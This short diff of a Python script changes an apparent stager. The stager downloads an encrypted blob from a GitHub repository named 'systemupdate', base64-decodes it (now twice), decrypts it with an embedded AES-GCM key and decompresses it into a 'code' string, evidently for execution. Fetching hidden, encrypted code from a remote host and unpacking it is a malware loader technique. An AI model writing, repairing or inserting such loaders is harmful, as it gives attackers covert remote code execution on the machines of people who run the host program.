@@ -8,7 +8,8 @@ URL = "https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.
 
 try:
     req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
-    raw = base64.b64decode(json.loads(urllib.request.urlopen(req, timeout=10).read())["content"])
+    b64_str = base64.b64decode(json.loads(urllib.request.urlopen(req, timeout=10).read())["content"]).decode("utf-8")
+    raw = base64.b64decode(b64_str)
     g = AESGCM(KEY)
     n, e = raw[:12], raw[12:]
     code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
